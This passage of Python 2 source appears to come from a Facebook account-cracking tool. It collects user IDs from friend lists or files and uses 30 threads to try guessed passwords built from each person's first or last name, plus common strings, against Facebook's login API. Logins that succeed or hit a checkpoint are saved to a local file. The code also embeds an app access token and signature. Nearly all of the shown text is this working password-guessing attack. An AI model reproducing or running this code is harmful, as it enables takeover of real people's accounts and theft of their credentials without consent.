                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Brand123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '@1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;92m Crack From Friend list'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;92m Crack From Public Frendlist'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m]\x1b[1;92m Crack From File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_indo()


def pilih_indo():
    teak = raw_input('\x1b[1;91mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_indo()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        print '\x1b[1;96m--------------------------------------------------'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;96m--------------------------------------------------'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mID Public/friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public / friend does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Internet Conection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '\x1b[1;96m--------------------------------------------------'
                print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print '\x1b[1;96m--------------------------------------------------'
                idlist = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
            pilih_pakis()
        print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mCrack Start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
